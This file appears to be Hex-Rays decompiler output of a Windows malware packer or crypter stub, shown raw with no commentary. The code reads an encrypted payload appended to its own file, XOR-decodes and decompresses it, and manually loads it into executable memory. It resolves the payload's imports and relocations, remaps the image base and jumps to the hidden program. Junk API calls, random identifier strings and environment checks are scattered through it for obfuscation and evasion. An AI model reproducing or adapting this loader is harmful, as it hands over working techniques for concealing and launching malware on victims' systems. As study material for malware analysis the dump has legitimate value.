/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int __cdecl sub_401000(int, int, int);
int __cdecl sub_4010C0(char *, int, unsigned int);
int __cdecl sub_4012B0(int *, char *);
HANDLE __cdecl sub_401330(LPCSTR lpFileName);
HBITMAP (__stdcall *__cdecl sub_401390(int, char, int))(HINSTANCE hInstance, LPCWSTR lpBitmapName);
// int __userpurge start@<eax>(int@<ebx>, int@<edi>, int@<esi>, HMODULE, int, int);
int __cdecl sub_401C70(int);
int __stdcall sub_401F00(int);
int __cdecl sub_4024F0(int, int);
int __cdecl sub_4025E0(int);
BOOL __cdecl sub_402650(LPVOID lpMem);
LPVOID __cdecl sub_402690(SIZE_T dwBytes);

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN loc_401B9A; // weak
// extern COLORREF (__stdcall *GetBkColor)(HDC hdc);
// extern int (__stdcall *GetTextFaceA)(HDC hdc, int c, LPSTR lpName);
// extern BOOL (__stdcall *ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// extern DWORD (__stdcall *SetFilePointer)(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
// extern DWORD (__stdcall *GetFileSize)(HANDLE hFile, LPDWORD lpFileSizeHigh);
// extern DWORD (__stdcall *GetModuleFileNameA)(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// extern void (__stdcall *GetStartupInfoA)(LPSTARTUPINFOA lpStartupInfo);
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern BOOL (__stdcall *HeapFree)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
// extern HANDLE (__stdcall *GetProcessHeap)();
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern LPVOID (__stdcall *VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// extern BOOL (__stdcall *VirtualFree)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
// extern BOOL (__stdcall *UnmapViewOfFile)(LPCVOID lpBaseAddress);
// extern LPVOID (__stdcall *MapViewOfFileEx)(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap, LPVOID lpBaseAddress);
// extern HANDLE (__stdcall *CreateFileMappingA)(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern void (__stdcall __noreturn *ExitProcess)(UINT uExitCode);
// extern LPVOID (__stdcall *HeapAlloc)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
// extern HANDLE (__stdcall *CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern HBITMAP (__stdcall *LoadBitmapW)(HINSTANCE hInstance, LPCWSTR lpBitmapName);
// extern UINT (__stdcall *EnumClipboardFormats)(UINT format);
// extern UINT (__stdcall *GetMenuDefaultItem)(HMENU hMenu, UINT fByPos, UINT gmdiFlags);
// extern HWND (__stdcall *GetDesktopWindow)();
// extern ATOM (__stdcall *RegisterClassExA)(const WNDCLASSEXA *);
// extern BOOL (__stdcall *SetMenuInfo)(HMENU, LPCMENUINFO);
// extern int (__stdcall *BroadcastSystemMessageW)(DWORD flags, LPDWORD lpInfo, UINT Msg, WPARAM wParam, LPARAM lParam);
// extern int (__stdcall *ToAsciiEx)(UINT uVirtKey, UINT uScanCode, const BYTE *lpKeyState, LPWORD lpChar, UINT uFlags, HKL dwhkl);
// extern BOOL (__stdcall *IsClipboardFormatAvailable)(UINT format);
// extern BOOL (__stdcall *EnumDisplaySettingsExA)(LPCSTR lpszDeviceName, DWORD iModeNum, DEVMODEA *lpDevMode, DWORD dwFlags);
// extern BOOL (__stdcall *MoveWindow)(HWND hWnd, int X, int Y, int nWidth, int nHeight, BOOL bRepaint);
// extern HCURSOR (__stdcall *SetCursor)(HCURSOR hCursor);
// extern BOOL (__stdcall *EnumThreadWindows)(DWORD dwThreadId, WNDENUMPROC lpfn, LPARAM lParam);
// extern LPWSTR (__stdcall *CharUpperW)(LPWSTR lpsz);
// extern HACCEL (__stdcall *LoadAcceleratorsW)(HINSTANCE hInstance, LPCWSTR lpTableName);
// extern HWND (__stdcall *CreateWindowExA)(DWORD dwExStyle, LPCSTR lpClassName, LPCSTR lpWindowName, DWORD dwStyle, int X, int Y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam);
// extern ATOM (__stdcall *RegisterClassA)(const WNDCLASSA *lpWndClass);
// extern HCURSOR (__stdcall *LoadCursorA)(HINSTANCE hInstance, LPCSTR lpCursorName);
// extern HICON (__stdcall *LoadIconA)(HINSTANCE hInstance, LPCSTR lpIconName);
// extern LRESULT (__stdcall *DefWindowProcA)(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
// extern BOOL (__stdcall *GetMonitorInfoW)(HMONITOR hMonitor, LPMONITORINFO lpmi);
// extern HMENU (__stdcall *LoadMenuIndirectW)(const MENUTEMPLATEW *lpMenuTemplate);
// extern HKL (__stdcall *GetKeyboardLayout)(DWORD idThread);
// extern HDC (__stdcall *GetDC)(HWND hWnd);
// extern BOOL (__stdcall *CopyRect)(LPRECT lprcDst, const RECT *lprcSrc);
// extern BOOL (__stdcall *SubtractRect)(LPRECT lprcDst, const RECT *lprcSrc1, const RECT *lprcSrc2);
CHAR IconName[] = "YpAUzznJPndUPcfzlprUjnkmDxiLmdfQpdAudJOE"; // idb
char aZscchq[7] = "zscchq"; // weak
CHAR WindowName[] = "GOqrOqwzWNIZ"; // idb
CHAR ClassName[] = "rEEFZBCcitqxnBoXQihYvxnsVVZOXmZB"; // idb
CHAR CursorName[] = "LbzejcdCNcNvjbUHIUsVaclUWPECsldiqeigc"; // idb
CHAR aYftDlbGoreyokl[] = "YFT_Dlb_gOREyoklUtrKvYKHHJIqggl_HOjlxI"; // idb
int dword_4040B8 = 0; // weak
int dword_4040BC = 0; // weak
int dword_4040C0 = 0; // weak
int dword_4040C4 = 0; // weak
int dword_4040C8 = 0; // weak
int dword_4040CC = 0; // weak
LPCVOID lpAddress = NULL; // idb
int dword_4040D4 = 0; // weak
int dword_4040D8 = 0; // weak
int dword_4040DC = 0; // weak
int dword_4040E0 = 0; // weak
LPVOID lpMem = NULL; // idb
int dword_4040E8 = 0; // weak
int dword_4040EC = 0; // weak
int dword_4040F0 = 0; // weak
int dword_4040F4 = 0; // weak
int (__stdcall *dword_4040F8)(_DWORD, _DWORD, _DWORD) = NULL; // weak
int dword_4040FC = 0; // weak


//----- (00401000) --------------------------------------------------------
int __cdecl sub_401000(int a1, int a2, int a3)
{
  int result; // eax
  struct tagRECT rcDst; // [esp+0h] [ebp-38h] BYREF
  RECT rcSrc; // [esp+10h] [ebp-28h] BYREF
  int v6; // [esp+20h] [ebp-18h]
  int v7; // [esp+28h] [ebp-10h]
  int v8; // [esp+2Ch] [ebp-Ch]
  int i; // [esp+30h] [ebp-8h]

  rcSrc.bottom = 1668993;
  rcSrc.left = 10537;
  rcSrc.right = 1380;
  dword_4040E0 = dword_4040D8;
  rcSrc.top = 6444873;
  v6 = 9331665 - dword_4040BC;
  CopyRect(&rcDst, &rcSrc);
  for ( i = 0; ; ++i )
  {
    result = i;
    if ( i >= a3 )
      break;
    v7 = (v8 * dword_4040C4) >> dword_4040FC;
    *(_BYTE *)(i + a1) = *(_BYTE *)(i + a2);
  }
  return result;
}
// 4040BC: using guessed type int dword_4040BC;
// 4040C4: using guessed type int dword_4040C4;
// 4040D8: using guessed type int dword_4040D8;
// 4040E0: using guessed type int dword_4040E0;
// 4040FC: using guessed type int dword_4040FC;

//----- (004010C0) --------------------------------------------------------
int __cdecl sub_4010C0(char *a1, int a2, unsigned int a3)
{
  HWND DesktopWindow; // eax
  HDC DC; // eax
  int result; // eax
  int v6; // eax
  int v7; // eax
  char Name[260]; // [esp+0h] [ebp-130h] BYREF
  int v9; // [esp+104h] [ebp-2Ch]
  int v10; // [esp+108h] [ebp-28h] BYREF
  int v11; // [esp+10Ch] [ebp-24h]
  int v12; // [esp+110h] [ebp-20h]
  unsigned int i; // [esp+114h] [ebp-1Ch]
  int v14; // [esp+118h] [ebp-18h]
  char v15; // [esp+11Fh] [ebp-11h]
  unsigned int v16; // [esp+120h] [ebp-10h] BYREF
  int v17; // [esp+124h] [ebp-Ch]
  unsigned int v18; // [esp+128h] [ebp-8h]
  char v19; // [esp+12Fh] [ebp-1h]

  dword_4040C0 = dword_4040E0 >> 26;
  Name[0] = 0;
  dword_4040E0 = v9;
  DesktopWindow = GetDesktopWindow();
  DC = GetDC(DesktopWindow);
  GetTextFaceA(DC, 255, Name);
  if ( !Name[0] )
  {
    dword_4040E0 = v9 >> dword_4040C0;
    v9 = 7785949;
  }
  result = v9 * dword_4040C0;
  v9 *= dword_4040C0;
  if ( a3 )
  {
    v15 = *a1;
    v18 = 1;
    v14 = 0;
    do
    {
      v19 = a1[v18++];
      v11 = dword_4040FC << dword_4040EC;
      if ( v19 == v15 )
      {
        if ( a1[v18] )
        {
          dword_4040FC = 784637 * dword_4040EC;
          v6 = sub_4012B0((int *)&v16, &a1[v18]);
          v18 += v6;
          dword_4040FC = v17 + v11 + dword_4040EC;
          v7 = sub_4012B0(&v10, &a1[v18]);
          result = v18 + v7;
          v18 = result;
          for ( i = 0; i < v16; ++i )
          {
            v11 <<= v11 + v12 * v17;
            result = a2;
            *(_BYTE *)(v14 + a2) = *(_BYTE *)(a2 + v14 - v10);
            ++v14;
          }
        }
        else
        {
          *(_BYTE *)(v14 + a2) = v15;
          ++v14;
          dword_4040FC = dword_4040EC << (2 * v17) >> 5;
          result = ++v18;
        }
      }
      else
      {
        *(_BYTE *)(v14 + a2) = v19;
        ++v14;
        result = dword_4040C4 << (dword_4040EC + v17);
        v11 = result;
      }
    }
    while ( v18 < a3 );
  }
  return result;
}
// 4040C0: using guessed type int dword_4040C0;
// 4040C4: using guessed type int dword_4040C4;
// 4040E0: using guessed type int dword_4040E0;
// 4040EC: using guessed type int dword_4040EC;
// 4040FC: using guessed type int dword_4040FC;
// 4010C0: using guessed type CHAR Name[260];

//----- (004012B0) --------------------------------------------------------
int __cdecl sub_4012B0(int *a1, char *a2)
{
  int v3; // [esp+0h] [ebp-28h]
  int v4; // [esp+4h] [ebp-24h]
  char v5; // [esp+Ch] [ebp-1Ch]
  int v6; // [esp+1Ch] [ebp-Ch]
  int v7; // [esp+20h] [ebp-8h]
  int v8; // [esp+24h] [ebp-4h]

  v7 = 0;
  v4 = 0;
  do
  {
    v5 = *a2++;
    dword_4040EC = v3 * dword_4040C4;
    v7 = v5 & 0x7F | (v7 << 7);
    v6 += v8;
    ++v4;
  }
  while ( (v5 & 0x80) != 0 );
  *a1 = v7;
  return v4;
}
// 4012DF: variable 'v3' is possibly undefined
// 4012FB: variable 'v8' is possibly undefined
// 4012FB: variable 'v6' is possibly undefined
// 4040C4: using guessed type int dword_4040C4;
// 4040EC: using guessed type int dword_4040EC;

//----- (00401330) --------------------------------------------------------
HANDLE __cdecl sub_401330(LPCSTR lpFileName)
{
  HANDLE FileA; // [esp+4h] [ebp-10h]

  FileA = CreateFileA(lpFileName, 0x80000000, 1u, 0, 3u, 0x80u, 0);
  if ( FileA == (HANDLE)-1 )
    return 0;
  else
    return FileA;
}
// 4040EC: using guessed type int dword_4040EC;
// 4040FC: using guessed type int dword_4040FC;

//----- (00401390) --------------------------------------------------------
HBITMAP (__stdcall *__cdecl sub_401390(int a1, char a2, int a3))(HINSTANCE hInstance, LPCWSTR lpBitmapName)
{
  HBITMAP (__stdcall *result)(HINSTANCE, LPCWSTR); // eax
  int i; // [esp+10h] [ebp-8h]

  result = LoadBitmapW;
  dword_4040C4 = (int)LoadBitmapW;
  for ( i = 0; i < a3; ++i )
  {
    result = (HBITMAP (__stdcall *)(HINSTANCE, LPCWSTR))(i + a1);
    *(_BYTE *)(i + a1) = a2;
  }
  return result;
}
// 4040C4: using guessed type int dword_4040C4;

//----- (004013E0) --------------------------------------------------------
int __userpurge start@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>, HMODULE a4, int a5, int a6)
{
  HMODULE ModuleHandleA; // eax
  HMODULE v7; // eax
  DWORD FileSize; // eax
  HMODULE v10; // eax
  SIZE_T dwBytes; // [esp+Ch] [ebp-E8h]
  unsigned int v12; // [esp+10h] [ebp-E4h]
  HCURSOR CursorA; // [esp+14h] [ebp-E0h]
  HCURSOR hCursor; // [esp+18h] [ebp-DCh]
  struct tagRECT rcDst; // [esp+1Ch] [ebp-D8h] BYREF
  RECT rcSrc; // [esp+2Ch] [ebp-C8h] BYREF
  WNDCLASSA WndClass; // [esp+3Ch] [ebp-B8h] BYREF
  HWND Window; // [esp+64h] [ebp-90h]
  LPSTR lpFilename; // [esp+68h] [ebp-8Ch]
  HMODULE v20; // [esp+6Ch] [ebp-88h]
  DWORD nNumberOfBytesToRead; // [esp+70h] [ebp-84h]
  DWORD NumberOfBytesRead; // [esp+74h] [ebp-80h] BYREF
  LPVOID lpBuffer; // [esp+78h] [ebp-7Ch]
  struct _STARTUPINFOA StartupInfo; // [esp+7Ch] [ebp-78h] BYREF
  HMODULE hModule; // [esp+C8h] [ebp-2Ch]
  int v26; // [esp+CCh] [ebp-28h]
  int v27; // [esp+D0h] [ebp-24h]
  int v28; // [esp+D4h] [ebp-20h]
  HANDLE hFile; // [esp+D8h] [ebp-1Ch]
  int v30; // [esp+DCh] [ebp-18h]
  int v31; // [esp+E0h] [ebp-14h]
  int v32; // [esp+E4h] [ebp-10h]
  char *i; // [esp+E8h] [ebp-Ch]
  int v34; // [esp+ECh] [ebp-8h]
  LONG lDistanceToMove; // [esp+F0h] [ebp-4h]
  int savedregs; // [esp+F4h] [ebp+0h] BYREF

  v32 = 921966 >> (dword_4040EC + dword_4040C4 + 90);
  dword_4040EC = (int)GetMonitorInfoW;
  WndClass.style = 0;
  WndClass.lpfnWndProc = DefWindowProcA;
  WndClass.cbClsExtra = 0;
  dword_4040FC = 861389 - v32;
  WndClass.cbWndExtra = 0;
  WndClass.hInstance = GetModuleHandleA(0);
  dword_4040FC = dword_4040FC << dword_4040FC << dword_4040FC;
  ModuleHandleA = GetModuleHandleA(0);
  WndClass.hIcon = LoadIconA(ModuleHandleA, IconName);
  WndClass.hCursor = LoadCursorA(0, (LPCSTR)0x7F00);
  dword_4040C4 = v28 * dword_4040EC + 168304;
  WndClass.hbrBackground = 0;
  WndClass.lpszMenuName = 0;
  WndClass.lpszClassName = aZscchq;
  dword_4040FC = 666473 << v34;
  RegisterClassA(&WndClass);
  if ( a5 == 1 )
  {
    dword_4040E8 = 1;
    lpAddress = a4;
  }
  else
  {
    dword_4040E8 = 0;
  }
  v7 = GetModuleHandleA(0);
  Window = CreateWindowExA(0, ClassName, WindowName, 1u, 340340, 2302297, 808, 26739, 0, 0, v7, 0);
  dword_4040FC = (int)LoadAcceleratorsW;
  v28 = dword_4040C4 >> v28 >> 12;
  if ( dword_4040E8 )
    hModule = a4;
  else
    hModule = GetModuleHandleA(0);
  rcSrc.bottom = 140727345;
  rcSrc.left = 38710;
  rcSrc.right = 71922071;
  v27 = -7241516;
  rcSrc.top = 2452;
  dword_4040E0 = dword_4040BC;
  CopyRect(&rcDst, &rcSrc);
  dword_4040C8 = 0;
  v20 = hModule;
  dword_4040FC = (int)CharUpperW;
  v32 = (int)CharUpperW >> 23 >> (v28 - 107);
  v26 = (int)hModule + *((_DWORD *)hModule + 15);
  sub_401390((int)&StartupInfo, 0, 68);
  StartupInfo.cb = 68;
  StartupInfo.lpDesktop = 0;
  v32 = v28 >> (-55 - dword_4040EC - dword_4040EC);
  GetStartupInfoA(&StartupInfo);
  dword_4040EC = (int)EnumThreadWindows;
  if ( !StartupInfo.lpDesktop )
    return 0;
  dword_4040C4 += 988983 - dword_4040FC - v34;
  dword_4040BC = 1469726;
  hCursor = LoadCursorA(0, CursorName);
  if ( hCursor )
  {
    v27 = dword_4040D8 << dword_4040E0;
    SetCursor(hCursor);
    v27 = dword_4040BC;
  }
  v27 = 2255859;
  v34 = dword_4040FC >> (v34 + v32);
  dword_4040EC = (int)MoveWindow;
  v30 = v26 + *(unsigned __int16 *)(v26 + 20) + 24;
  v30 += 40 * (*(unsigned __int16 *)(v26 + 6) - 1);
  lDistanceToMove = *(_DWORD *)(v30 + 20)
                  + *(_DWORD *)(v26 + 60)
                  * ((unsigned int)(*(_DWORD *)(v30 + 16) + *(_DWORD *)(v26 + 60) - 1)
                   / *(_DWORD *)(v26 + 60));
  dword_4040FC = (int)EnumDisplaySettingsExA;
  lpFilename = (LPSTR)sub_402690(0x200u);
  if ( !lpFilename )
    return 0;
  dword_4040C4 = (int)IsClipboardFormatAvailable;
  GetModuleFileNameA(hModule, lpFilename, 0x200u);
  dword_4040BC = v27 - 9676513;
  CursorA = LoadCursorA(0, aYftDlbGoreyokl);
  if ( CursorA )
  {
    v27 = 1357727;
    SetCursor(CursorA);
    v27 += 4945373;
  }
  dword_4040BC = (v27 * v27) << v27;
  v32 = 9368 - v28 - 958923 * v28;
  hFile = sub_401330(lpFilename);
  if ( !hFile )
    return 0;
  v32 = dword_4040FC >> (-10 * dword_4040C4 - 102);
  dword_4040FC = (int)ToAsciiEx;
  FileSize = GetFileSize(hFile, 0);
  nNumberOfBytesToRead = FileSize - lDistanceToMove;
  dword_4040EC = (int)BroadcastSystemMessageW;
  if ( FileSize == lDistanceToMove )
    return 0;
  lpBuffer = sub_402690(nNumberOfBytesToRead + 16);
  if ( !lpBuffer )
    return 0;
  v34 = (v32 * v28) << dword_4040EC;
  SetFilePointer(hFile, lDistanceToMove, 0, 0);
  if ( !ReadFile(hFile, lpBuffer, nNumberOfBytesToRead, &NumberOfBytesRead, 0) )
    return 0;
  if ( NumberOfBytesRead != nNumberOfBytesToRead )
    return 0;
  dword_4040EC = (int)SetMenuInfo;
  dword_4040FC = 370056 << v32 >> (v32 * (_BYTE)SetMenuInfo);
  CloseHandle(hFile);
  dword_4040C4 = (int)RegisterClassExA;
  if ( NumberOfBytesRead != nNumberOfBytesToRead )
    return 0;
  dword_4040EC = (int)SubtractRect;
  sub_401000((int)lpBuffer, (int)lpBuffer + nNumberOfBytesToRead - 64, 64);
  dword_4040EC = (int)GetMenuDefaultItem;
  if ( GetBkColor((HDC)0x15C561) == -1 )
  {
    dword_4040BC = dword_4040C8 - 5266723;
    v27 <<= dword_4040D8 + dword_4040E0;
  }
  dword_4040D8 = (v27 - dword_4040C8) << 6;
  v12 = *(_DWORD *)lpBuffer;
  dword_4040C4 = (int)EnumClipboardFormats;
  dword_4040D8 = 4383850 * v27;
  if ( GetBkColor((HDC)0x9963) == -1 )
    v27 = 962219;
  v27 <<= dword_4040C0;
  dwBytes = *((_DWORD *)lpBuffer + 1);
  for ( i = 0; (unsigned int)i < v12; i += 8 )
  {
    *(_DWORD *)((char *)lpBuffer + (_DWORD)i + 8) ^= 0xCFAu;
    v34 = dword_4040C4 + 382934;
  }
  lpMem = sub_402690(dwBytes);
  if ( !lpMem )
    ExitProcess(0x1795716u);
  sub_4010C0((char *)lpBuffer + 8, (int)lpMem, v12);
  i = (char *)&loc_401B9A;
  dword_4040EC = dword_4040C4 << dword_4040FC;
  dword_4040F4 = (int)NtCurrentTeb();
  v28 = 0;
  dword_4040CC = a2;
  dword_4040B8 = a3;
  dword_4040DC = a1;
  v32 = 0;
  dword_4040D4 = (int)&savedregs;
  dword_4040FC = v31 - 971343;
  if ( dword_4040E8 )
  {
    sub_401C70(i - (_BYTE *)lpAddress);
  }
  else
  {
    v10 = GetModuleHandleA(0);
    sub_401C70(i - (char *)v10);
  }
  if ( !sub_401F00((int)lpMem) )
  {
    sub_402650(lpMem);
    ExitProcess(0x582353u);
  }
  dword_4040EC = dword_4040EC >> v32 >> v31;
  dword_4040FC = 2685 << (v28 * v32);
  return dword_4040F8(a4, a5, a6);
}
// 4040B8: using guessed type int dword_4040B8;
// 4040BC: using guessed type int dword_4040BC;
// 4040C0: using guessed type int dword_4040C0;
// 4040C4: using guessed type int dword_4040C4;
// 4040C8: using guessed type int dword_4040C8;
// 4040CC: using guessed type int dword_4040CC;
// 4040D4: using guessed type int dword_4040D4;
// 4040D8: using guessed type int dword_4040D8;
// 4040DC: using guessed type int dword_4040DC;
// 4040E0: using guessed type int dword_4040E0;
// 4040E8: using guessed type int dword_4040E8;
// 4040EC: using guessed type int dword_4040EC;
// 4040F4: using guessed type int dword_4040F4;
// 4040F8: using guessed type int (__stdcall *dword_4040F8)(_DWORD, _DWORD, _DWORD);
// 4040FC: using guessed type int dword_4040FC;

//----- (00401C70) --------------------------------------------------------
int __cdecl sub_401C70(int a1)
{
  HMODULE ModuleHandleA; // [esp+4h] [ebp-38h]
  _DWORD *v3; // [esp+8h] [ebp-34h]
  int v4; // [esp+Ch] [ebp-30h]
  SIZE_T *v5; // [esp+10h] [ebp-2Ch]
  int v6; // [esp+14h] [ebp-28h]
  unsigned int v7; // [esp+18h] [ebp-24h]
  int v8; // [esp+20h] [ebp-1Ch]
  int v9; // [esp+28h] [ebp-14h]
  _DWORD *i; // [esp+2Ch] [ebp-10h]
  unsigned int j; // [esp+34h] [ebp-8h]
  int v12; // [esp+38h] [ebp-4h]

  dword_4040EC = (int)GetKeyboardLayout;
  dword_4040C4 = (int)LoadMenuIndirectW;
  if ( dword_4040E8 )
    ModuleHandleA = (HMODULE)lpAddress;
  else
    ModuleHandleA = GetModuleHandleA(0);
  if ( !ModuleHandleA )
    return 0;
  dword_4040C4 = 367950 * v6 * dword_4040EC;
  v5 = (SIZE_T *)((char *)ModuleHandleA + *((_DWORD *)ModuleHandleA + 15));
  dword_4040F0 = (int)VirtualAlloc(0, v5[20], 0x3000u, 0x40u);
  if ( dword_4040F0 )
  {
    v9 = dword_4040C4 + 71289 * dword_4040FC;
    sub_401000(dword_4040F0, (int)ModuleHandleA, v5[20]);
    v4 = dword_4040F0 - (_DWORD)ModuleHandleA;
    if ( v5[41] )
    {
      for ( i = (_DWORD *)((char *)ModuleHandleA + v5[40]); i[1]; i = (_DWORD *)((char *)i + i[1]) )
      {
        v12 = dword_4040FC + v9 + 943420;
        v7 = (unsigned int)(i[1] - 8) >> 1;
        v3 = i + 2;
        for ( j = 0; j < v7; ++j )
        {
          v8 = 8 * ((670715 * v12) << v8);
          if ( (int)*((unsigned __int16 *)v3 + j) >> 12 == 3 )
            *(_DWORD *)(*i + dword_4040F0 + (*((_WORD *)v3 + j) & 0xFFF)) += v4;
        }
      }
    }
    __asm { jmp     eax }
  }
  return 0;
}
// 401CC9: variable 'v6' is possibly undefined
// 401DEB: variable 'v8' is possibly undefined
// 4040C4: using guessed type int dword_4040C4;
// 4040E8: using guessed type int dword_4040E8;
// 4040EC: using guessed type int dword_4040EC;
// 4040F0: using guessed type int dword_4040F0;
// 4040FC: using guessed type int dword_4040FC;

//----- (00401F00) --------------------------------------------------------
int __stdcall sub_401F00(int a1)
{
  const CHAR *j; // [esp+4h] [ebp-50h]
  _DWORD *v3; // [esp+Ch] [ebp-48h]
  char *v4; // [esp+10h] [ebp-44h]
  int v5; // [esp+14h] [ebp-40h]
  char *v6; // [esp+14h] [ebp-40h]
  int *v7; // [esp+18h] [ebp-3Ch]
  const CHAR *v8; // [esp+1Ch] [ebp-38h]
  unsigned int v9; // [esp+20h] [ebp-34h]
  int v10; // [esp+28h] [ebp-2Ch]
  _DWORD *v11; // [esp+2Ch] [ebp-28h]
  int *v12; // [esp+30h] [ebp-24h]
  int v13; // [esp+34h] [ebp-20h]
  int v14; // [esp+38h] [ebp-1Ch]
  const CHAR *k; // [esp+3Ch] [ebp-18h]
  HMODULE hModule; // [esp+40h] [ebp-14h]
  int v17; // [esp+44h] [ebp-10h]
  unsigned int i; // [esp+48h] [ebp-Ch]
  unsigned int m; // [esp+48h] [ebp-Ch]
  HANDLE hFileMappingObject; // [esp+4Ch] [ebp-8h]
  char v21; // [esp+50h] [ebp-4h]

  v5 = *(_DWORD *)(a1 + 60) + a1;
  v11 = (_DWORD *)(v5 + *(unsigned __int16 *)(v5 + 20) + 24);
  v8 = (const CHAR *)VirtualAlloc(0, *(_DWORD *)(v5 + 80), 0x3000u, 0x40u);
  if ( !v8 )
    return 0;
  dword_4040C4 = 0;
  sub_401000((int)v8, a1, *(_DWORD *)(a1 + 60) + 40 * *(unsigned __int16 *)(v5 + 6) + 312);
  for ( i = 0; i < *(unsigned __int16 *)(v5 + 6); ++i )
  {
    dword_4040FC = 0;
    if ( v11[5] )
    {
      if ( v11[4] )
        sub_401000(
          (int)&v8[v11[3]],
          v11[5] + a1,
          *(_DWORD *)(v5 + 60) * ((unsigned int)(v11[4] + *(_DWORD *)(v5 + 60) - 1) / *(_DWORD *)(v5 + 60)));
    }
    dword_4040FC *= v10;
    v11 += 10;
  }
  v6 = (char *)&v8[*((_DWORD *)v8 + 15)];
  for ( j = &v8[*((_DWORD *)v6 + 32)]; *((_DWORD *)j + 4); j += 20 )
  {
    hModule = GetModuleHandleA(&v8[*((_DWORD *)j + 3)]);
    if ( !hModule )
    {
      if ( dword_4040E8 )
        return 0;
      hModule = LoadLibraryA(&v8[*((_DWORD *)j + 3)]);
      v14 = v13 * 931152 * dword_4040C4;
      if ( !hModule )
        return 0;
    }
    v10 = dword_4040FC << (dword_4040EC + v13);
    if ( *(_DWORD *)j )
    {
      v12 = (int *)&v8[*(_DWORD *)j];
      v7 = (int *)&v8[*((_DWORD *)j + 4)];
    }
    else
    {
      v12 = (int *)&v8[*((_DWORD *)j + 4)];
      v7 = (int *)&v8[*(_DWORD *)j];
    }
    v17 = 0;
    if ( *((_DWORD *)j + 4) && *(_DWORD *)j )
      v17 = 1;
    while ( *v12 )
    {
      v10 = dword_4040C4 - v14;
      if ( *v12 >= 0 )
        *v12 = (int)GetProcAddress(hModule, &v8[*v12 + 2]);
      else
        *v12 = (int)GetProcAddress(hModule, (LPCSTR)(*v12 & 0x7FFFFFFF));
      if ( !*v12 )
        return 0;
      if ( v17 )
        *v7 = *v12;
      ++v12;
      ++v7;
    }
  }
  if ( dword_4040E8 )
  {
    v4 = (char *)lpAddress - *((_DWORD *)v6 + 13);
    if ( *((_DWORD *)v6 + 41) )
    {
      for ( k = &v8[*((_DWORD *)v6 + 40)]; *((_DWORD *)k + 1); k += *((_DWORD *)k + 1) )
      {
        v9 = (unsigned int)(*((_DWORD *)k + 1) - 8) >> 1;
        v3 = k + 8;
        for ( m = 0; m < v9; ++m )
        {
          v10 = 0;
          if ( (int)*((unsigned __int16 *)v3 + m) >> 12 == 3 )
            *(_DWORD *)&v8[*(_DWORD *)k + (*((_WORD *)v3 + m) & 0xFFF)] += v4;
        }
      }
    }
  }
  hFileMappingObject = CreateFileMappingA((HANDLE)0xFFFFFFFF, 0, 4u, 0, *((_DWORD *)v6 + 20), 0);
  if ( !hFileMappingObject )
    return 0;
  dword_4040FC = v14 + 473968;
  if ( dword_4040E8 )
    dword_4040F0 = (int)MapViewOfFileEx(hFileMappingObject, 0x22u, 0, 0, 0, (LPVOID)lpAddress);
  else
    dword_4040F0 = (int)MapViewOfFileEx(hFileMappingObject, 0x22u, 0, 0, 0, *((LPVOID *)v6 + 13));
  if ( dword_4040F0 )
    goto LABEL_66;
  v10 = v14 << (v10 * v13);
  if ( dword_4040E8 )
  {
    if ( !UnmapViewOfFile(lpAddress) && !VirtualFree((LPVOID)lpAddress, 0, 0x8000u) )
      return 0;
  }
  else if ( !UnmapViewOfFile(*((LPCVOID *)v6 + 13)) && !VirtualFree(*((LPVOID *)v6 + 13), 0, 0x8000u) )
  {
    return 0;
  }
  dword_4040F0 = (int)(dword_4040E8 ? MapViewOfFileEx(hFileMappingObject, 0x22u, 0, 0, 0, (LPVOID)lpAddress) : MapViewOfFileEx(hFileMappingObject, 0x22u, 0, 0, 0, *((LPVOID *)v6 + 13)));
  if ( !dword_4040F0 )
  {
    dword_4040F0 = (int)(dword_4040E8 ? VirtualAlloc((LPVOID)lpAddress, *((_DWORD *)v6 + 20), 0x3000u, 0x40u) : VirtualAlloc(*((LPVOID *)v6 + 13), *((_DWORD *)v6 + 20), 0x3000u, 0x40u));
    if ( !dword_4040F0 )
      return 0;
  }
LABEL_66:
  dword_4040FC = 156494 << (v21 * dword_4040EC);
  sub_401000(dword_4040F0, (int)v8, *((_DWORD *)v6 + 20));
  if ( dword_4040E8 )
    sub_4024F0((int)lpAddress, *((_DWORD *)v6 + 10) + dword_4040F0);
  else
    sub_4025E0(dword_4040F0);
  dword_4040C4 = v14 - 396453;
  dword_4040F8 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD))(*((_DWORD *)v6 + 10) + dword_4040F0);
  *((_DWORD *)v6 + 10) = dword_4040F8;
  dword_4040C4 = v10 >> dword_4040FC;
  return 1;
}
// 40200A: variable 'v10' is possibly undefined
// 402091: variable 'v13' is possibly undefined
// 402129: variable 'v14' is possibly undefined
// 402446: variable 'v21' is possibly undefined
